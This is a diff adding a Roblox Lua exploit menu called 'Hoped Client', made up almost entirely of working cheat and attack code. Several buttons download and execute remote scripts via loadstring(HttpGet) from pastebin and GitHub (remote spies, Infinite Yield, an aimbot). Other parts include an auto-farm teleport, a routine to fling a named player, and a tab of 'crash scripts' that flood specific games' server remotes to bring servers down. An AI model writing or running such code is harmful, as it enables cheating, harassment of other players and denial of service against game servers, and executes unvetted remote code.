@@ -1,0 +1,194 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "Hoped Client",
+   LoadingTitle = "Rayfield Interface Suite",
+   LoadingSubtitle = "by Hope",
+   ConfigurationSaving = {
+      Enabled = false,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   }})
+
+local Tab = Window:CreateTab("Exploits", 4483362458) -- Title, Image
+
+--Remote Spy
+local ButtonRemoteSpy = Tab:CreateButton({
+   Name = "Remote Spy",
+   Callback = function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/bCghX33W", true))()
+   end,
+})
+
+--Simple Remote Spy
+local ButtonSimpleRemoteSpy = Tab:CreateButton({
+   Name = "Simple Remote Spy",
+   Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+   end,
+})
+
+--Infinity Yield
+local ButtonIY = Tab:CreateButton({
+   Name = "Infinity Yield",
+   Callback = function()
+		loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Yield.txt"))()
+   end,
+})
+
+--AimBot V2
+local ButtonAimBot = Tab:CreateButton({
+   Name = "Aimbot V2 by Exunys (Closes this GUI)",
+   Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Aimbot%20V2%20GUI.lua"))()
+   end,
+})
+
+--Dex V4
+local ButtonDexV4 = Tab:CreateButton({
+   Name = "Dex V4",
+   Callback = function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/loglizzy/dexV4/main/main.lua'))()
+   end,
+})
+
+--WoTZ Auto Farm
+local ButtonWoTZ_AF = Tab:CreateButton({
+   Name = "WoTZ Auto Farm",
+   Callback = function()
+		local startpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+			for i, v in pairs(game:GetService("Workspace").StaticSpawns:GetDescendants()) do
+				if v.Name == "ProximityPrompt_Lootable" then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
+					wait(0.3)
+					fireproximityprompt(v, 50)
+				end
+			end
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = startpos
+   end,
+})
+
+--Fling
+local Input = Tab:CreateInput({
+   Name = "Fling Player",
+   PlaceholderText = "Player nickname (not display)",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+		local Settings = {
+		   Target = Text
+		}
+		
+		local Players = game:GetService("Players")
+		local RunService = game:GetService("RunService")
+		
+		local LocalPlayer = Players.LocalPlayer
+		local Target = Players:FindFirstChild(Settings.Target)
+		
+		local BodyAngularVelocity = Instance.new("BodyAngularVelocity")
+		BodyAngularVelocity.AngularVelocity = Vector3.new(10^6, 10^6, 10^6)
+		BodyAngularVelocity.MaxTorque = Vector3.new(10^6, 10^6, 10^6)
+		BodyAngularVelocity.P = 10^6
+		
+		if not Target then return end
+		BodyAngularVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
+		
+		while Target.Character.HumanoidRootPart and LocalPlayer.Character.HumanoidRootPart do
+		   RunService.RenderStepped:Wait()
+		   LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * LocalPlayer.Character.HumanoidRootPart.CFrame.Rotation
+		   LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new()
+		end
+		   
+		BodyAngularVelocity.Parent = nil
+   end,
+})
+
+local Tab = Window:CreateTab("Crash Scripts", 4483362458) -- Title, Image
+--Краш Джаста
+local ButtonJZ = Tab:CreateButton({
+   Name = "Just Zone Crash",
+   Callback = function()
+		while task.wait() do
+			for i = 1, 30 do
+      			game:GetService("ReplicatedStorage")["ACS_Script"].Events.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
+  			end
+		end
+   end,
+})
+--Краш АКС
+local ButtonACS = Tab:CreateButton({
+   Name = "ACS Crash",
+   Callback = function()
+		while task.wait() do
+			for i = 1, 30 do
+      			game:GetService("ReplicatedStorage")["ACS_Engine"].Events.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
+  			end
+		end
+   end,
+})
+--Краш ДЧ1
+local ButtonSoC = Tab:CreateButton({
+   Name = "Spritits of Chornobyl Crash",
+   Callback = function()
+		while task.wait() do
+		
+		  for i = 1, 30 do
+		      game:GetService("ReplicatedStorage")["Remotes"].VisualizeMuzzle:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
+		  end
+		end
+   end,
+})
+--Краш ДЧ2
+local ButtonSoC2 = Tab:CreateButton({
+   Name = "Spritits of Chornobyl Crash 2",
+   Callback = function()
+		local id = {
+		137714793,
+		106709021,
+		376527115,
+		7259123616,
+		5410286086,
+		6414034271,
+		6414026542,
+		6414029797,
+		7394713560,
+		7394603967,
+		6934244289,
+		6773872990,
+		4904654004,
+		6809852636,
+		6036593327,
+		8303730595,
+		5700133881,
+		5830124624,
+		4197739997,
+		7168000945,
+		7806887000,
+		3809556436
+		}
+		
+		local newCode = "1"--string.reverse(string.upper(game.JobId))
+		
+		local w = workspace
+		local plr = game.Players.LocalPlayer
+		local cf = CFrame.new
+		
+		-- Main Code
+		game:GetService("RunService").RenderStepped:Connect(function()
+		    for index, hat in pairs(plr.Character:GetChildren()) do -- оптимизатор что-бы не лагало
+		        if hat:IsA("Accessory") then
+		            hat:Destroy()
+		        end
+		    end
+		    game:GetService("RunService").RenderStepped:Connect(function()
+		        w[plr.Name].HumanoidRootPart.CFrame = cf(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
+		        for index, hat in pairs(plr.Character:GetChildren()) do -- оптимизатор что-бы не лагало
+		            if hat:IsA("Accessory") then
+		                hat:Destroy()
+		            end
+		        end
+		        for index, hat in pairs(id) do
+		            game:GetService("ReplicatedStorage"):WaitForChild("PutOnClothes"):FireServer(newCode, hat)
+		        end
+		    end)
+		end)
+   end})
